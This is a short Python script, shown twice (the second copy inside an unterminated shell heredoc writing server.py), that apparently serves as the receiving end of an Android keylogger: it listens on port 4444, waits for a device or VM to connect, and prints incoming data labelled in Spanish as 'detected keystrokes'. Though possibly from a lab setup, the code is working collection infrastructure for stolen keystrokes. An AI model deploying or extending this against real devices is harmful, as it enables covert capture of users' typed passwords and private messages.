import socket

def iniciar_servidor():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    print("[*] Servidor desde cero escuchando en el puerto 4444... Esperando conexión de Android...")

    conexion, direccion = server.accept()
    print(f"[+] ¡Conexión establecida con éxito desde la VM!: {direccion}")

    try:
        while True:
            datos = conexion.recv(1024)
            if not datos:
                break
            print(f"[Teclas detectadas]: {datos.decode('utf-8', errors='ignore').strip()}")
    except KeyboardInterrupt:
        print("\n[-] Apagando el servidor.")
    finally:
        conexion.close()
        server.close()

if __name__ == "__main__":
    iniciar_servidor()
cat << 'EOF' > server.py
import socket

def iniciar_servidor():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    print("[*] Servidor desde cero escuchando en el puerto 4444... Esperando conexión de Android...")

    conexion, direccion = server.accept()
    print(f"[+] ¡Conexión establecida con éxito desde la VM!: {direccion}")

    try:
        while True:
            datos = conexion.recv(1024)
            if not datos:
                break
            print(f"[Teclas detectadas]: {datos.decode('utf-8', errors='ignore').strip()}")
    except KeyboardInterrupt:
        print("\n[-] Apagando el servidor.")
    finally:
        conexion.close()
        server.close()

if __name__ == "__main__":
    iniciar_servidor()
